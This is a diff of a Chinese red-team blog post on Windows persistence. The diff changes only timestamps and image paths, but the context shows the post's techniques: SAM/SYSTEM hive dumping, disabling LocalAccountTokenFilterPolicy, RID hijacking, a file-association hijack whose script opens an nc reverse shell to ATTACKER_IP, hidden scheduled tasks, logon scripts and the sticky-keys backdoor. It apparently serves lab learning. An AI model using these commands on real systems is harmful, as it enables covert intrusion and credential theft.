@@ -7,7 +7,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://hadagaga.github.io/img/Windows_Local_Persistence/cover.png">
 <meta property="article:published_time" content="2025-06-11T16:00:00.000Z">
-<meta property="article:modified_time" content="2025-06-12T12:47:54.305Z">
+<meta property="article:modified_time" content="2025-06-12T12:52:01.051Z">
 <meta property="article:author" content="hada">
 <meta property="article:tag" content="Windows">
 <meta property="article:tag" content="RedTeam">
@@ -19,7 +19,7 @@
   "url": "http://hadagaga.github.io/2025/06/12/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/",
   "image": "http://hadagaga.github.io/img/Windows_Local_Persistence/cover.png",
   "datePublished": "2025-06-11T16:00:00.000Z",
-  "dateModified": "2025-06-12T12:47:54.305Z",
+  "dateModified": "2025-06-12T12:52:01.051Z",
   "author": [
     {
       "@type": "Person",
@@ -160,7 +160,7 @@
   isHighlightShrink: false,
   isToc: true,
   pageType: 'post'
-}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/img/background.png);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/headimg.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">22</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">15</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/Windows_Local_Persistence/cover.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/headimg.jpg" alt="Logo"><span class="site-name">hada的个人博客</span></a><a class="nav-page-title" href="/"><span class="site-name">Windows权限维持</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">Windows权限维持</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-06-11T16:00:00.000Z" title="发表于 2025-06-12 00:00:00">2025-06-12</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-06-12T12:47:54.305Z" title="更新于 2025-06-12 20:47:54">2025-06-12</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BA%A2%E9%98%9F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/">红队学习记录</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前些天发了一篇关于Windows权限提升的文章，这一篇算是下文，关于Windows权限维持的。当我们成功在目标机器上获取到了一定的权限，我们就需要考虑权限维持了，该文章所有的操作都默认已经拥有了一定的权限甚至是system权限。</p>
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/img/background.png);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/headimg.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">22</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">15</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/Windows_Local_Persistence/cover.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/headimg.jpg" alt="Logo"><span class="site-name">hada的个人博客</span></a><a class="nav-page-title" href="/"><span class="site-name">Windows权限维持</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">Windows权限维持</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-06-11T16:00:00.000Z" title="发表于 2025-06-12 00:00:00">2025-06-12</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-06-12T12:52:01.051Z" title="更新于 2025-06-12 20:52:01">2025-06-12</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BA%A2%E9%98%9F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/">红队学习记录</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前些天发了一篇关于Windows权限提升的文章，这一篇算是下文，关于Windows权限维持的。当我们成功在目标机器上获取到了一定的权限，我们就需要考虑权限维持了，该文章所有的操作都默认已经拥有了一定的权限甚至是system权限。</p>
 <p>Windows权限维持一般都考虑如下几个方面：用户、服务、文件、软件。具体就是如下几种：</p>
 <ul>
 <li>低权限用户篡改</li>
@@ -186,12 +186,12 @@
 <p>设置好后，我们将使用 <code>WinRM</code> 进行下面的操作。如果你现在尝试从攻击者的机器连接，你会发现，即使你属于 <code>Backups Operators</code> 组，你也无法按预期访问所有文件。快速检查一下我们分配的组，就会发现我们属于 Backup Operators 组，但该组已被禁用，执行命令:</p>
 <figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami /groups</span><br></pre></td></tr></table></figure>
 
-<p><img src="/1748685393467-d694384c-62ad-4538-9fcb-bf615cec7d64.png" alt="img"></p>
+<p><img src="/img/1748685393467-d694384c-62ad-4538-9fcb-bf615cec7d64.png" alt="img"></p>
 <p>这是由于用户帐户控制 ( UAC ) 造成的。UAC 实现的功能之一：<code>LocalAccountTokenFilterPolicy</code>会在远程登录时剥夺任何本地帐户的管理权限。虽然你可以通过UAC从图形用户会话中提升权限，但如果使用的是 <code>WinRM</code>，那么你将受限于一个没有管理权限的受限访问令牌。</p>
 <p>为了能够重新获得用户的管理权限，我们必须通过将以下注册表项更改为 1 来禁用<code>LocalAccountTokenFilterPolicy</code>：</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d <span class="number">1</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/1748685640377-75370d52-2917-4356-9c8b-28cbfef60242.png" alt="img"></p>
+<p><img src="/img/1748685640377-75370d52-2917-4356-9c8b-28cbfef60242.png" alt="img"></p>
 <p>之后我们就可以将SAM和SYSTEM文件下载到我们的攻击机上了</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">reg save hklm\system system.bak  	<span class="comment">#备份system</span></span><br><span class="line">reg save hklm\sam sam.bak   		<span class="comment">#备份SAM</span></span><br><span class="line">download system.bak					<span class="comment">#下载system</span></span><br><span class="line">download sam.bak					<span class="comment">#下载SAM</span></span><br></pre></td></tr></table></figure>
 
@@ -207,7 +207,7 @@
 <figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secedit /export /cfg config.inf</span><br></pre></td></tr></table></figure>
 
 <p>我们打开文件并将我们的用户添加到有关 <code>SeBackupPrivilege</code> 和 <code>SeRestorePrivilege</code> 的配置行中：</p>
-<p><img src="/1748686600073-8bd596c5-f5ee-4368-91e9-dcb2da12ea2b.png" alt="img"></p>
+<p><img src="/img/1748686600073-8bd596c5-f5ee-4368-91e9-dcb2da12ea2b.png" alt="img"></p>
 <p>我们最终将 .inf 文件转换为 <code>.sdb</code> 文件，然后使用该文件将配置加载回系统：</p>
 <figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">secedit /import /cfg config.inf /db config.sdb</span><br><span class="line"></span><br><span class="line">secedit /configure /db config.sdb /cfg config.inf</span><br></pre></td></tr></table></figure>
 
@@ -216,7 +216,7 @@
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-PSSessionConfiguration</span> <span class="literal">-Name</span> Microsoft.PowerShell <span class="literal">-showSecurityDescriptorUI</span></span><br></pre></td></tr></table></figure>
 
 <p>在GUI中添加<code>thmuser2</code>用户并设置为完全控制。</p>
-<p><img src="/1748686891336-955c18db-eacc-4a68-9624-f180c2244d87.png" alt="img"></p>
+<p><img src="/img/1748686891336-955c18db-eacc-4a68-9624-f180c2244d87.png" alt="img"></p>
 <p>之后我们就可以利用<code>winRM</code>进行远程连接了，由于用户拥有 <code>SeBackup</code> 和 <code>SeRestore</code> 权限，我们可以重复上述步骤，从 <code>SAM</code> 恢复密码哈希，并重新连接到管理员用户。如果你检查用户的组成员身份，你会发现它看起来像一个普通用户。</p>
 <blockquote>
 <p>注意：要使该用户充分使用给定的权限，您必须更改<code>LocalAccountTokenFilterPolicy</code>注册表项，但我们之前已经完成此操作，这里不再重复操作。</p>
@@ -232,12 +232,12 @@
 <figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PsExec64.exe -i -s regedit</span><br></pre></td></tr></table></figure>
 
 <p>在 <code>Regedit</code> 中，我们将找到<code>HKLM\SAM\SAM\Domains\Account\Users\</code>计算机中每个用户对应的键。由于我们想要修改 <code>thmuser3</code>，因此需要搜索一个键，其 RID 为十六进制 (1010 &#x3D; 0x3F2)。在相应的键下，会有一个名为F的值，它在位置 0x30 处保存着用户的有效 RID</p>
-<p><img src="/1748695851178-3df186a9-d326-42ad-8bfc-b89274c525f5.png" alt="img"></p>
+<p><img src="/img/1748695851178-3df186a9-d326-42ad-8bfc-b89274c525f5.png" alt="img"></p>
 <blockquote>
 <p>注意：RID 采用小端表示法存储，因此其字节显示为反转。</p>
 </blockquote>
 <p>现在，我们将用十六进制的管理员 RID（500 &#x3D; 0x01F4）替换这两个字节，并交换字节（F401）：</p>
-<p><img src="/1748695888462-3a5dd7f4-826d-4e35-abb1-24421efa595b.png" alt="img"></p>
+<p><img src="/img/1748695888462-3a5dd7f4-826d-4e35-abb1-24421efa595b.png" alt="img"></p>
 <p>下次登录时，LSASS 会将其与管理员相同的 RID 关联，并授予其相同的权限。</p>
 <h2 id="Windows服务"><a href="#Windows服务" class="headerlink" title="Windows服务"></a>Windows服务</h2><p>篡改Windows服务也可以作为我们权限维持的一种方式，因为它们可以配置为在受害计算机启动时在后台运行。如果我们可以利用任何服务为我们运行某些程序，那么我们就可以在每次受害计算机启动时重新获得对它的控制权。</p>
 <p>Windows服务本质上是在后台运行的可执行文件。配置服务时，需要定义要使用的可执行文件，并选择服务是在计算机启动时自动运行还是手动启动。</p>
@@ -286,15 +286,15 @@
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe <span class="literal">-WindowStyle</span> <span class="keyword">hidden</span> C:\Windows\System32\backdoor.ps1</span><br></pre></td></tr></table></figure>
 
 <h3 id="劫持关联文件"><a href="#劫持关联文件" class="headerlink" title="劫持关联文件"></a>劫持关联文件</h3><p>操作系统默认的文件关联保存在注册表中，注册表项中为 下的每种文件类型都存储一个键<code>HKLM\Software\Classes\</code>。假设我们想检查哪个程序用于打开 <code>.txt</code> 文件；我们可以直接检查<code>.txt</code>子键，并找到与之关联的程序 <code>ID</code> (<code>ProgID</code>)  。<code>ProgID</code> 只是系统中已安装程序的标识符。对于 <code>.txt</code> 文件，我们将获得以下 <code>ProgID</code>：</p>
-<p><img src="/1748761618514-83802e82-cf1f-4af8-a1c7-feeeca950060.png" alt="img"></p>
+<p><img src="/img/1748761618514-83802e82-cf1f-4af8-a1c7-feeeca950060.png" alt="img"></p>
 <p>然后，我们可以搜索相应 <code>ProgID</code> 的子键（也在下<code>HKLM\Software\Classes\</code>），在本例中是 <code>txtfile</code>，我们将在其中找到对负责处理 <code>.txt</code> 文件的程序的引用。大多数 <code>ProgID</code> 条目都会有一个子键，在该子键下<code>shell\open\command</code>指定了针对该扩展名的文件运行的默认命令：</p>
-<p><img src="/1748761667073-46c5c6ee-2ac7-41ea-9b3c-f310950892f8.png" alt="img"></p>
+<p><img src="/img/1748761667073-46c5c6ee-2ac7-41ea-9b3c-f310950892f8.png" alt="img"></p>
 <p>在这种情况下，当尝试打开 .txt 文件时，系统将执行<code>%SystemRoot%\system32\NOTEPAD.EXE %1</code>，其中<code>%1</code>表示打开的文件名。如果我们想要劫持此扩展程序，可以将该命令替换为一个脚本，该脚本会执行后门，然后照常打开文件。首先，让我们创建一个包含以下内容的 <code>ps1</code> 脚本并将其保存到<code>C:\Windows\backdoor2.ps1</code>：</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Start-Process</span> <span class="literal">-NoNewWindow</span> <span class="string">&quot;c:\tools\nc64.exe&quot;</span> <span class="string">&quot;-e cmd.exe ATTACKER_IP 4448&quot;</span></span><br><span class="line">C:\Windows\system32\NOTEPAD.EXE <span class="variable">$args</span>[<span class="number">0</span>]</span><br></pre></td></tr></table></figure>
 
 <p>注意，在<code>Powershell</code>中，我们必须传递<code>$args[0]</code>给记事本，因为它包含将要打开的文件的名称。</p>
 <p>现在让我们更改注册表项以在隐藏窗口中运行后门脚本：</p>
-<p><img src="/1748761765224-df2f5f31-bf58-4982-9920-383e327f0140.png" alt="img"></p>
+<p><img src="/img/1748761765224-df2f5f31-bf58-4982-9920-383e327f0140.png" alt="img"></p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="literal">-windowstyle</span> <span class="keyword">hidden</span> 路径 %<span class="number">1</span></span><br></pre></td></tr></table></figure>
 
 <h2 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h2><p>这里的思路和Windows服务差不多，都是修改可执行文件为我们的可执行文件实现权限维持。</p>
@@ -309,11 +309,11 @@
 <h3 id="隐藏计划任务"><a href="#隐藏计划任务" class="headerlink" title="隐藏计划任务"></a>隐藏计划任务</h3><p>虽然我们的计划任务已经成功执行，并且回弹了shell，但是有一个问题。当用户尝试列出计划任务，我们的后门就会暴露出来，为了进一步隐蔽我们的行踪，我们需要隐藏我们的计划任务。我们可以通过删除计划任务的安全描述符(SD)使这个任务对任何用户都不可见。安全描述符就是一个ACL，它声明了那些用户有权访问该任务，假设没有权限自然无法查询到这个任务。删除SD相当于禁止所有用户(包括管理员)访问该计划任务。</p>
 <p>所有计划任务的安全描述符都存储在<code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\</code>。每个任务都有一个注册表项，该项下名为“SD”的值包含安全描述符。只有拥有 SYSTEM 权限才能删除该值。</p>
 <p>为了隐藏我们创建的计划任务，我们需要删除之前创建的任务的SD值。</p>
-<p><img src="/1748765496737-7be603e6-b32f-43be-af8e-a620f109195e.png" alt="img"></p>
+<p><img src="/img/1748765496737-7be603e6-b32f-43be-af8e-a620f109195e.png" alt="img"></p>
 <p>这里已经删除了。再次查询就会提示没有这个任务</p>
 <figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /query /tn thm-taskbackdoor</span><br></pre></td></tr></table></figure>
 
-<p><img src="/1748765546554-57ca079a-4780-4a6d-baef-47fc11a26b79.png" alt="img"></p>
+<p><img src="/img/1748765546554-57ca079a-4780-4a6d-baef-47fc11a26b79.png" alt="img"></p>
 <p>但反弹shell仍然会正常回弹。</p>
 <h2 id="登录触发权限维持"><a href="#登录触发权限维持" class="headerlink" title="登录触发权限维持"></a>登录触发权限维持</h2><p>Windows的某些配置会在启动时执行特定目录下的可执行文件，我们可以利用这一点实现权限维持。</p>
 <h3 id="启动文件夹"><a href="#启动文件夹" class="headerlink" title="启动文件夹"></a>启动文件夹</h3><p>每个用户都有一个文件夹，<code>C:\Users\&lt;your_username&gt;\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</code>将可执行文件放入其中，用户登录时会运行。攻击者只需在其中投放<code>payload</code>即可实现权限维持。请注意，每个用户只会运行其文件夹中可用的内容。</p>
@@ -345,7 +345,7 @@
 <p>下次登陆时就会执行我们的<code>payload</code>了。</p>
 <h3 id="登陆脚本"><a href="#登陆脚本" class="headerlink" title="登陆脚本"></a>登陆脚本</h3><p>加载用户配置文件时，<code>userinit.exe</code>会检查名为<code>UserInitMprLogonScript</code>的环境变量。我们可以设置此环境变量为用户分配登录脚本，该脚本将在用户登录计算机时运行。该变量默认未设置，因此我们可以创建它并设置为任何我们想要的脚本。</p>
 <p>上传<code>payload</code>后，依旧移动到<code>C:\Windows</code>。修改注册表<code>HKCU\Environment</code>，我们修改其中的<code>UserInitMprLogonScript</code>项，指向我们的<code>payload</code>，示例如下：</p>
-<p><img src="/1748776032084-5bc20a5b-f130-4bb5-ae45-be533c7ffaac.png" alt="img"></p>
+<p><img src="/img/1748776032084-5bc20a5b-f130-4bb5-ae45-be533c7ffaac.png" alt="img"></p>
 <h2 id="登录页面后门"><a href="#登录页面后门" class="headerlink" title="登录页面后门"></a>登录页面后门</h2><p>如果我们可以物理访问机器（或者是RDP），那么您可以在没有机器有效凭证的情况下通过后门访问登录屏幕来访问终端。</p>
 <p>下面给出两种方法：</p>
 <h3 id="粘滞键"><a href="#粘滞键" class="headerlink" title="粘滞键"></a>粘滞键</h3><p>当我们按下五次shift后，系统会默认执行<code>C:\Windows\System32\sethc.exe</code>，假设我们将其替换为我们的<code>payload</code>就可以实现通过快捷键触发他。一种直接在登录页面出发命令行的方法就是将<code>sethc.exe</code>替换为<code>cmd.exe</code></p>
